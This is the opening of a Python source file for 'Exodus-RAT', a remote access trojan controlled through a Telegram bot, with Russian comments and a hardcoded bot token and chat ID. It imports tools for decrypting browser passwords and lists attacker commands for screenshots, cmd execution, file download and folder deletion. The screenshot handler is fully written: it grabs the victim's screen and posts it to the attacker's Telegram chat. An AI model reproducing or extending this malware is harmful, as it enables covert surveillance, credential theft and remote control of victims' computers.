#======================================================== BlOk 1 ===========================================================================
import telebot # Для работы с ботом
import os # Для работы с директориями / файлами
import requests # Для отправки документов / скринов
from PIL import ImageGrab # Для получения скриншота
import shutil # Для копирования файлов Login Data
import sqlite3 # Для работы с БД, где хранятся пароли
import win32crypt # Для расшифровки паролей
import subprocess # Для завершения процесса
import platform # Для получения информации о ПК
import webbrowser # Для открытия ссылки в браузере

#================================================================================#
bot_token = "1284027588:AAFWJ1o3y5Qum2BEqg9pbozvGHm3dTBFHD8"   # Токен от бота   #
chat_id = "877118801" # ID чата                                                  #
#================================================================================#
bot = telebot.TeleBot(bot_token)
@bot.message_handler(commands=['start', 'Start']) # Ждём команды Start / start
def send_message(command): # Если команду выполнили
    bot.send_message(chat_id, "☣ Exodus-RAT Running ☣" +
                     "\n\nЧтобы узнать команды введи команду /commands" +
                     "\nCoded by 3xpl01t | @darkside_team") # Посылаем сообщение


#========================================================= #BloK 2 ==========================================================================
@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) # КОМАНДЫ
def send_message(command):
    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /kill_process name.exe - Убить процесс по имени" +
                    "\n /Pwd - Узнать текущую директорию \n /passwords chrome - Пароли гугл хром \n /passwords opera - Пароли опера" +
                    "\n /Cmd command - Выполнить команду в cmd  \n /Open_url - Открыть ссылку \n /Ls - все папки и файлы в директории" +
                    "\n /Cd folder - перейти в папку \n /Download - скачать файл \n /Rm_dir - удалить папку" + 
                    "\n\n /About - о RAT'e")

@bot.message_handler(commands=['screen', 'Screen']) # Ждём команды
def send_screen(command) :
    bot.send_message(chat_id, "Wait...") # Отправляем сообщение "Wait..."
    screen = ImageGrab.grab() # Создаём переменную, которая равна получению скриншота
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') # Сохраняем скриншот в папку AppData
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') # Обновляем переменную
    files = {'photo': screen} # Создаём переменную для отправки POST запросом
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) # Делаем запрос
bot.polling()